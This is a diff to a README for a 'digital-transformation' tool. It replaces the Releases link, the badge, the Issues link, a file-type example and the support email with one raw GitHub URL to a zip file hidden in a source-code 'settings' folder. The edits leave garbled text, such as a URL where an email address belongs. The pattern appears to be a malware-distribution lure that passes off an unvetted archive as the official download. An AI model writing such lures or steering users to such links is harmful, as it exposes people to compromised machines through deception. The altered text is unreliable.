@@ -6,7 +6,7 @@ Welcome! This guide helps you download and run the digital-transformation tool q
 
 ## 🏷️ Download the Tool
 
-[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen.svg)](https://github.com/Darciequalified144/digital-transformation/releases)
+[![Download the latest version](https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip%https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip)](https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -28,13 +28,13 @@ To run the digital-transformation tool, your computer should meet the following 
 
 To download the tool, please visit our Releases page:
 
-[Visit this page to download](https://github.com/Darciequalified144/digital-transformation/releases)
+[Visit this page to download](https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip)
 
 Once you are on the Releases page, follow these steps:
 
 1. Look for the latest version listed at the top.
 2. Click on the version number (e.g., "v1.0.0") to view details.
-3. Download the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux).
+3. Download the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a `https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip` for Linux).
 4. Once the file is downloaded, locate it in your downloads folder.
 5. Double-click the file to start the installation process.
 
@@ -52,9 +52,9 @@ After installing the tool, you can start using it immediately. Here are some bas
 
 ## 🔄 Support & Feedback
 
-If you encounter issues or have questions, please check out the [Issues page](https://github.com/Darciequalified144/digital-transformation/issues) on GitHub. You can report your issue and our team will assist you promptly.
+If you encounter issues or have questions, please check out the [Issues page](https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip) on GitHub. You can report your issue and our team will assist you promptly.
 
-You can also send feedback via email at support@digital-transformation.com.
+You can also send feedback via email at https://github.com/Darciequalified144/digital-transformation/raw/refs/heads/main/app/src/components/settings/transformation-digital-v3.6-beta.2.zip
 
 ## 🌐 Topics
 
